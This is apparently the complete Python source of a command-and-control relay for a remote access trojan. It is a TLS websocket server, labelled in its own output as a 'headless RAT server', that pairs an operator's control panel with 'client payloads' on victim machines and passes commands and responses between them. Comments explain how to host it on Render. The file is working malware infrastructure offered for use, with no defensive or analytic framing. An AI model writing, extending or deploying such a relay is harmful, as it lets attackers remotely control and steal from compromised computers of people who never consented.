import asyncio
import websockets
import ssl
import pathlib
import json

CONNECTED_PARTIES = {} # Will hold both the panel and the clients

async def handler(websocket, path):
    """
    Handles connections from both the control panel and the client payloads.
    Routes messages between them.
    """
    print(f"[*] New connection from {websocket.remote_address}")
    try:
        # The first message determines the party's role (panel or client)
        # and the session_id they are interested in.
        initial_message = await websocket.recv()
        data = json.loads(initial_message)
        
        role = data.get("role")
        session_id = data.get("session_id")

        if not role or not session_id:
            await websocket.close(1011, "Role and session_id required.")
            return

        # Register the party
        if session_id not in CONNECTED_PARTIES:
            CONNECTED_PARTIES[session_id] = {"panel": None, "client": None}
            
        if role == "panel":
            CONNECTED_PARTIES[session_id]["panel"] = websocket
            print(f"[*] Control Panel connected for session {session_id}")
        elif role == "client":
            CONNECTED_PARTIES[session_id]["client"] = websocket
            print(f"[*] Client Payload connected for session {session_id}")
        
        # Main message routing loop
        while True:
            message = await websocket.recv()
            
            session = CONNECTED_PARTIES.get(session_id, {})
            panel_ws = session.get("panel")
            client_ws = session.get("client")

            # Route messages to the other party
            if role == "panel" and client_ws:
                await client_ws.send(message)
            elif role == "client" and panel_ws:
                await panel_ws.send(message)

    except websockets.ConnectionClosed:
        print(f"[!] A connection closed.")
    finally:
        # Clean up on disconnect
        if session_id and session_id in CONNECTED_PARTIES:
            # This is a simplified cleanup. A real-world app would need more robust handling.
            if CONNECTED_PARTIES[session_id].get("panel") == websocket:
                CONNECTED_PARTIES[session_id]["panel"] = None
            if CONNECTED_PARTIES[session_id].get("client") == websocket:
                CONNECTED_PARTIES[session_id]["client"] = None
            
            # If both are gone, remove the session entry
            if not CONNECTED_PARTIES[session_id]["panel"] and not CONNECTED_PARTIES[session_id]["client"]:
                del CONNECTED_PARTIES[session_id]
                print(f"[*] Session {session_id} is now empty and has been removed.")

async def main():
    # Render provides the certs at a specific path.
    # We will use a local path for now, but this will be important for Render.
    cert_path = pathlib.Path(__file__).with_name("certs")
    certfile = cert_path / "cert.pem"
    keyfile = cert_path / "key.pem"
    
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_context.load_cert_chain(certfile, keyfile)

    # Render assigns the port dynamically via the PORT environment variable.
    # It also requires binding to host 0.0.0.0.
    host = "0.0.0.0"
    port = int(os.environ.get("PORT", 8765)) # Use 8765 as default for local testing
    
    print(f"[*] Starting headless RAT server on wss://{host}:{port}")
    async with websockets.serve(handler, host, port, ssl=ssl_context, max_size=None):
        await asyncio.Future()

if __name__ == "__main__":
    import os
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("[*] Server is shutting down.")